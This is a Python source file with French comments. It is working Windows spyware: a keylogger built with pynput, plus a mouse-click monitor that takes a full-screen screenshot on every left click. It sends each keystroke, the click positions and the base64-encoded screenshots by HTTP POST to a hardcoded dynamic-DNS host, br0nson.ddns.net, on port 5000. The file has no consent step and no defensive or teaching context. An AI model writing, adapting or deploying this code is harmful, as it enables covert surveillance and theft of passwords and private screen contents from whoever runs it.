import win32api
import win32con
import time
from PIL import ImageGrab
import os
from datetime import datetime
from pynput import keyboard
import requests
import json
import base64
import io  # Import nécessaire pour BytesIO

SERVER_URL = "http://br0nson.ddns.net:5000"

def get_mouse_click_positions():
    try:
        while True:
            # Vérifie l'état des boutons de la souris
            state_left = win32api.GetKeyState(win32con.VK_LBUTTON)
            state_right = win32api.GetKeyState(win32con.VK_RBUTTON)
            state_middle = win32api.GetKeyState(win32con.VK_MBUTTON)

            if state_left < 0:
                x, y = win32api.GetCursorPos()
                print('\nClic gauche en position ({}, {})'.format(x, y))

                # Prendre une capture d'écran
                screenshot = ImageGrab.grab()

                # Encoder l'image en base64
                buffered = io.BytesIO()
                screenshot.save(buffered, format="PNG")
                img_base64 = base64.b64encode(buffered.getvalue()).decode("utf-8")

                # Préparer les données à envoyer en JSON
                data = {
                    "click_type": "left_click",
                    "position": {"x": x, "y": y},
                    "timestamp": datetime.now().isoformat(),
                    "screenshot": img_base64
                }

                # Envoyer la requête POST avec les données en JSON
                try:
                    response = requests.post(f"{SERVER_URL}/upload", json=data)
                    print(f"Serveur réponse : {response.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"Erreur d'envoi au serveur : {e}")

                # Attend que le bouton soit relâché
                while win32api.GetKeyState(win32con.VK_LBUTTON) < 0:
                    time.sleep(0.01)

            elif state_right < 0:
                x, y = win32api.GetCursorPos()
                print('\nClic droit en position ({}, {})'.format(x, y))

                # Préparer les données à envoyer en JSON
                data = {
                    "click_type": "right_click",
                    "position": {"x": x, "y": y},
                    "timestamp": datetime.now().isoformat(),
                    "screenshot": None  # Pas de capture d'écran pour le clic droit
                }

                # Envoyer la requête POST avec les données en JSON
                try:
                    response = requests.post(f"{SERVER_URL}/upload", json=data)
                    print(f"Serveur réponse : {response.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"Erreur d'envoi au serveur : {e}")

                # Attend que le bouton soit relâché
                while win32api.GetKeyState(win32con.VK_RBUTTON) < 0:
                    time.sleep(0.01)

            elif state_middle < 0:
                x, y = win32api.GetCursorPos()
                print('\nClic milieu en position ({}, {})'.format(x, y))

                # Préparer les données à envoyer en JSON
                data = {
                    "click_type": "middle_click",
                    "position": {"x": x, "y": y},
                    "timestamp": datetime.now().isoformat(),
                    "screenshot": None  # Pas de capture d'écran pour le clic milieu
                }

                # Envoyer la requête POST avec les données en JSON
                try:
                    response = requests.post(f"{SERVER_URL}/upload", json=data)
                    print(f"Serveur réponse : {response.status_code}")
                except requests.exceptions.RequestException as e:
                    print(f"Erreur d'envoi au serveur : {e}")

                # Attend que le bouton soit relâché
                while win32api.GetKeyState(win32con.VK_MBUTTON) < 0:
                    time.sleep(0.01)

            time.sleep(0.01)
    except KeyboardInterrupt:
        print("\nProgramme arrêté.")

def keyPressed(key):
    try:
        char = key.char  # Essaie d'obtenir le caractère
        print(char, end='', flush=True)
        # Préparer les données à envoyer
        data = {
            "key": char,
            "timestamp": datetime.now().isoformat()
        }
        # Envoyer la requête POST au serveur
        try:
            response = requests.post(f"{SERVER_URL}/upload/key", json=data)
            print(f"Serveur réponse (key) : {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erreur d'envoi au serveur (key) : {e}")
    except AttributeError:
        # Gère les touches spéciales
        special_key = str(key)
        print(special_key, end='', flush=True)
        data = {
            "key": special_key,
            "timestamp": datetime.now().isoformat()
        }
        # Envoyer la requête POST au serveur
        try:
            response = requests.post(f"{SERVER_URL}/upload/key", json=data)
            print(f"Serveur réponse (key) : {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Erreur d'envoi au serveur (key) : {e}")

if __name__ == "__main__":
    # Démarrer le listener du clavier
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Démarrer la capture des clics de souris
    get_mouse_click_positions()
